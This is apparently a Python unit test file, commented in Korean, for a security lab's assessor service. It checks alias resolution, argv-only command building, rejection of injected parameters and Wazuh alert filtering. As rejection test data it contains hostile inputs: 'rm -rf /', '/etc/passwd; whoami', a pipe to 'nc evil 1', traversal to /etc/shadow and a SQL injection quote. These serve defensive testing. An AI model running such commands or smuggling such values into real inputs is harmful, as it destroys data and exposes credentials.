"""el34 Assessor — 보안 핵심 로직 단위 테스트 (stdlib unittest 만; docker/fastapi 불필요).

검증 초점(7절 DoD):
  - CC 가 준 임의 문자열이 셸 exec 로 흐르지 않음(argv 템플릿 + 화이트리스트)
  - 미지원 type / 위험 파라미터는 passed:false 가 아니라 명시적 error 로 거부
  - alerts.json 필터(wazuh_alert/fim_change/command_ran) 정확성
  - targets 별칭 해석

실행:  python3 -m unittest assessor.tests.test_checks -v   (repo 루트에서)
"""
from __future__ import annotations

import unittest

from assessor.checks import run_check, SUPPORTED_TYPES
from assessor.checks.base import ExecResult
from assessor import targets


class FakeExecutor:
    """argv 를 기록하고 정해진 결과를 반환. 셸이 개입하지 않음을 검증하는 데 사용.

    osquery_rows=None → osqueryi 부재(exit 127) 시뮬레이션(→ docker.sock 폴백 경로 테스트).
    osquery_rows=리스트 → osqueryi --json 가 그 rows 를 반환(→ osquery 경로 테스트).
    """

    def __init__(self, result: ExecResult | None = None, osquery_rows=None):
        self.calls: list[tuple[str, list[str]]] = []
        self._result = result or ExecResult(0, "", "")
        self._osquery_rows = osquery_rows

    def exec(self, container, argv, timeout=15):
        self.calls.append((container, argv))
        if argv and argv[0] == "osqueryi":
            if self._osquery_rows is None:
                return ExecResult(127, "", "osqueryi: not found")
            import json as _j
            return ExecResult(0, _j.dumps(self._osquery_rows), "")
        return self._result


class FakeAlerts:
    def __init__(self, alerts):
        self._alerts = alerts

    def alerts(self, since_sec=None):
        return list(self._alerts)


# ─── targets ────────────────────────────────────────────────────────────────
class TargetsTest(unittest.TestCase):
    def test_aliases(self):
        self.assertEqual(targets.resolve_container("web"), "el34-web")
        self.assertEqual(targets.resolve_container("waf"), "el34-web")
        self.assertEqual(targets.resolve_container("fw"), "el34-fw")
        self.assertEqual(targets.resolve_container("secu"), "el34-fw")
        self.assertEqual(targets.resolve_container("ips"), "el34-ips")
        self.assertEqual(targets.resolve_container("ids"), "el34-ips")
        self.assertEqual(targets.resolve_container("siem"), "el34-siem")
        self.assertEqual(targets.resolve_container("admin"), "el34-adminconsole")
        self.assertEqual(targets.resolve_container("el34-web"), "el34-web")

    def test_unknown(self):
        with self.assertRaises(KeyError):
            targets.resolve_container("does-not-exist")


# ─── 호스트 검사: argv 템플릿 합성 ────────────────────────────────────────────
class HostCheckTest(unittest.TestCase):
    def test_file_exists_osquery(self):
        # osquery 경로 — file 테이블 rows 반환 시 passed
        ex = FakeExecutor(osquery_rows=[{"path": "/etc/apache2/apache2.conf",
                                         "size": "100", "mtime": "x"}])
        r = run_check({"id": "c1", "type": "file_exists", "target": "web",
                       "params": {"path": "/etc/apache2/apache2.conf"}}, ex, None)
        self.assertTrue(r["passed"])
        self.assertEqual(r["raw"]["engine"], "osquery")
        cont, argv = ex.calls[0]
        self.assertEqual(cont, "el34-web")
        self.assertEqual(argv[0], "osqueryi")          # SQL 은 단일 argv(셸 없음)
        self.assertIn("/etc/apache2/apache2.conf", argv[2])   # path 가 SQL 리터럴에 안전 삽입

    def test_file_exists_osquery_not_found(self):
        ex = FakeExecutor(osquery_rows=[])             # 빈 결과 → not found
        r = run_check({"id": "c1", "type": "file_exists", "target": "web",
                       "params": {"path": "/nope"}}, ex, None)
        self.assertFalse(r["passed"])

    def test_file_exists_fallback_to_exec(self):
        # osquery 부재(attacker 등) → docker.sock stat 폴백
        ex = FakeExecutor(ExecResult(0, "/etc/x|size=10|mtime=now", ""), osquery_rows=None)
        r = run_check({"id": "c1", "type": "file_exists", "target": "attacker",
                       "params": {"path": "/etc/hostname"}}, ex, None)
        self.assertTrue(r["passed"])
        self.assertEqual(r["raw"]["engine"], "exec")
        self.assertEqual(ex.calls[-1][1][0], "stat")   # 마지막 호출은 stat 폴백

    def test_file_contains_fixed_vs_regex(self):
        ex = FakeExecutor(ExecResult(0, "12:SecRuleEngine On", ""))
        run_check({"id": "c", "type": "file_contains", "target": "web",
                   "params": {"path": "/etc/modsecurity/modsecurity.conf",
                              "pattern": "SecRuleEngine On"}}, ex, None)
        self.assertIn("-F", ex.calls[0][1])   # 고정 문자열
        ex2 = FakeExecutor(ExecResult(0, "x", ""))
        run_check({"id": "c", "type": "file_contains", "target": "web",
                   "params": {"path": "/etc/x", "regex": "Sec.*On"}}, ex2, None)
        self.assertIn("-E", ex2.calls[0][1])  # 정규식

    def test_port_listening_osquery(self):
        ex = FakeExecutor(osquery_rows=[{"port": "80", "protocol": "6", "address": "0.0.0.0"}])
        r = run_check({"id": "c", "type": "port_listening", "target": "web",
                       "params": {"port": 80}}, ex, None)
        self.assertTrue(r["passed"])
        ex2 = FakeExecutor(osquery_rows=[])            # 빈 결과 → 미리슨
        r2 = run_check({"id": "c", "type": "port_listening", "target": "web",
                        "params": {"port": 8080}}, ex2, None)
        self.assertFalse(r2["passed"])

    def test_port_listening_fallback_ss(self):
        ss_out = ("State  Recv-Q Send-Q Local Address:Port Peer Address:Port\n"
                  "LISTEN 0      128    0.0.0.0:80        0.0.0.0:*\n")
        ex = FakeExecutor(ExecResult(0, ss_out, ""), osquery_rows=None)
        r = run_check({"id": "c", "type": "port_listening", "target": "attacker",
                       "params": {"port": 80}}, ex, None)
        self.assertTrue(r["passed"])
        self.assertEqual(ex.calls[-1][1][0], "ss")

    def test_process_running_osquery(self):
        ex = FakeExecutor(osquery_rows=[{"pid": "1", "name": "apache2",
                                         "cmdline": "/usr/sbin/apache2 -D FOREGROUND"}])
        r = run_check({"id": "c", "type": "process_running", "target": "web",
                       "params": {"pattern": "apache2"}}, ex, None)
        self.assertTrue(r["passed"])
        sql = ex.calls[0][1][2]
        self.assertIn("apache2", sql)                  # SQL LIKE 에 패턴 삽입
        self.assertIn("osqueryi", sql)                 # self-match 방지(name != 'osqueryi')

    def test_process_running_fallback_pgrep(self):
        ex = FakeExecutor(ExecResult(0, "123 nmap -sS", ""), osquery_rows=None)
        r = run_check({"id": "c", "type": "process_running", "target": "attacker",
                       "params": {"pattern": "nmap"}}, ex, None)
        self.assertTrue(r["passed"])
        self.assertEqual(ex.calls[-1][1][0], "pgrep")

    def test_log_contains_python_filter(self):
        ex = FakeExecutor(ExecResult(0, "line a\nALERT sqli here\nline b\n", ""))
        r = run_check({"id": "c", "type": "log_contains", "target": "ips",
                       "params": {"log": "suricata", "pattern": "sqli"}}, ex, None)
        self.assertTrue(r["passed"])
        self.assertEqual(ex.calls[0][0], "el34-ips")   # suricata 기본 컨테이너
        self.assertEqual(ex.calls[0][1][0], "tail")


# ─── 보안: 주입/미지원은 명시적 error(passed None) ────────────────────────────
class SecurityRejectTest(unittest.TestCase):
    def _err(self, spec):
        r = run_check(spec, FakeExecutor(), None)
        self.assertIsNone(r["passed"], f"should be rejected: {spec}")
        self.assertIn("error", r)
        return r

    def test_unsupported_type(self):
        self._err({"id": "c", "type": "run_shell", "target": "web",
                   "params": {"cmd": "rm -rf /"}})

    def test_path_injection_semicolon(self):
        self._err({"id": "c", "type": "file_exists", "target": "web",
                   "params": {"path": "/etc/passwd; rm -rf /"}})

    def test_path_traversal(self):
        self._err({"id": "c", "type": "file_exists", "target": "web",
                   "params": {"path": "/var/../../etc/shadow"}})

    def test_path_with_space_and_pipe(self):
        self._err({"id": "c", "type": "file_contains", "target": "web",
                   "params": {"path": "/etc/x | nc evil 1", "pattern": "x"}})

    def test_pattern_control_char(self):
        self._err({"id": "c", "type": "file_contains", "target": "web",
                   "params": {"path": "/etc/x", "pattern": "a\nb"}})

    def test_unknown_target(self):
        self._err({"id": "c", "type": "file_exists", "target": "evilbox",
                   "params": {"path": "/etc/x"}})

    def test_port_out_of_range(self):
        self._err({"id": "c", "type": "port_listening", "target": "web",
                   "params": {"port": 99999}})

    def test_missing_params(self):
        self._err({"id": "c", "type": "file_exists", "target": "web", "params": {}})

    def test_osquery_sql_quote_escaped(self):
        # pattern 에 작은따옴표가 와도 SQL 리터럴이 '' 로 이스케이프(osquery read-only)
        ex = FakeExecutor(osquery_rows=[])
        run_check({"id": "c", "type": "process_running", "target": "web",
                   "params": {"pattern": "a' OR '1'='1"}}, ex, None)
        sql = ex.calls[0][1][2]
        self.assertNotIn("a' OR", sql)          # 원문 그대로 들어가지 않음
        self.assertIn("a'' OR", sql)            # 이스케이프됨

    def test_no_exec_on_rejection(self):
        # 거부된 요청은 컨테이너 exec 가 일어나지 않아야 함
        ex = FakeExecutor()
        run_check({"id": "c", "type": "file_exists", "target": "web",
                   "params": {"path": "/etc/passwd; whoami"}}, ex, None)
        self.assertEqual(ex.calls, [])


# ─── Wazuh alerts.json 필터 ──────────────────────────────────────────────────
def _alert(rule_id, level, groups, **extra):
    a = {"timestamp": "2026-06-03T12:00:00.000+0000",
         "rule": {"id": rule_id, "level": level, "groups": groups,
                  "description": extra.pop("desc", "test")},
         "agent": {"name": extra.pop("agent", "web")}}
    a.update(extra)
    return a


class WazuhCheckTest(unittest.TestCase):
    def test_wazuh_alert_by_rule_id(self):
        src = FakeAlerts([_alert("5710", 5, ["authentication_failed"]),
                          _alert("100250", 3, ["haproxy", "denat"])])
        r = run_check({"id": "c", "type": "wazuh_alert",
                       "params": {"rule_id": "100250"}}, None, src)
        self.assertTrue(r["passed"])
        r2 = run_check({"id": "c", "type": "wazuh_alert",
                        "params": {"rule_id": "999999"}}, None, src)
        self.assertFalse(r2["passed"])

    def test_wazuh_alert_by_groups(self):
        src = FakeAlerts([_alert("100251", 6, ["haproxy", "web_attack", "attack"])])
        r = run_check({"id": "c", "type": "wazuh_alert",
                       "params": {"groups": ["web_attack"]}}, None, src)
        self.assertTrue(r["passed"])

    def test_fim_change(self):
        a = _alert("550", 7, ["syscheck", "ossec"],
                   syscheck={"path": "/etc/nftables.conf", "event": "modified"})
        src = FakeAlerts([a])
        r = run_check({"id": "c", "type": "fim_change",
                       "params": {"path": "/etc/nftables.conf"}}, None, src)
        self.assertTrue(r["passed"])
        # 디렉터리 prefix 매칭
        a2 = _alert("550", 7, ["syscheck"],
                    syscheck={"path": "/etc/suricata/suricata.yaml", "event": "modified"})
        src2 = FakeAlerts([a2])
        r2 = run_check({"id": "c", "type": "fim_change",
                        "params": {"dir": "/etc/suricata"}}, None, src2)
        self.assertTrue(r2["passed"])
        # 비-syscheck 알림은 매칭 안 됨
        src3 = FakeAlerts([_alert("100250", 3, ["haproxy"])])
        r3 = run_check({"id": "c", "type": "fim_change",
                        "params": {"path": "/etc/nftables.conf"}}, None, src3)
        self.assertFalse(r3["passed"])

    def test_command_ran(self):
        a = _alert("100260", 3, ["el34", "cmdlog", "audit"],
                   data={"cmd_user": "ccc", "cmd_host": "attacker",
                         "command": "sqlmap -u http://juice.el34.lab"},
                   full_log="el34cmd: host=attacker user=ccc pwd=/home/ccc rc=0 cmd=sqlmap -u ...")
        src = FakeAlerts([a])
        r = run_check({"id": "c", "type": "command_ran",
                       "params": {"pattern": "sqlmap"}}, None, src)
        self.assertTrue(r["passed"])
        # user 필터
        r2 = run_check({"id": "c", "type": "command_ran",
                        "params": {"pattern": "sqlmap", "user": "root"}}, None, src)
        self.assertFalse(r2["passed"])
        # 비-cmdlog 알림 무시
        src2 = FakeAlerts([_alert("5710", 5, ["authentication_failed"])])
        r3 = run_check({"id": "c", "type": "command_ran",
                        "params": {"pattern": "sqlmap"}}, None, src2)
        self.assertFalse(r3["passed"])


class CatalogTest(unittest.TestCase):
    def test_supported_types(self):
        for t in ("file_exists", "file_contains", "file_hash", "process_running",
                  "port_listening", "log_contains", "wazuh_alert", "fim_change",
                  "command_ran"):
            self.assertIn(t, SUPPORTED_TYPES)


if __name__ == "__main__":
    unittest.main(verbosity=2)
